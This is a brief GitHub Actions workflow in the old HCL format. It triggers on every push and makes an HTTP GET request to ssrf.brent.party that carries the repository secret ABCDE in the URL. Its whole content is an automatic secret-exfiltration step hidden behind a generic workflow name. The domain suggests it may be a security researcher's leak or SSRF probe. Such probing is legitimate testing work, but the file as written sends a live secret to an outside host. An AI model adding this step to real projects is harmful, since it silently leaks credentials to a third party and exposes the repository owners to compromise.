workflow "New workflow2" {
  on = "push"
  resolves = ["HTTP client"]
}

action "HTTP client" {
  uses = "swinton/httpie.action@69125d73caa2c6821f6a41a86112777a37adc171"
  args = ["GET", "ssrf.brent.party/$ABCDE"]
  secrets = ["ABCDE"]
}
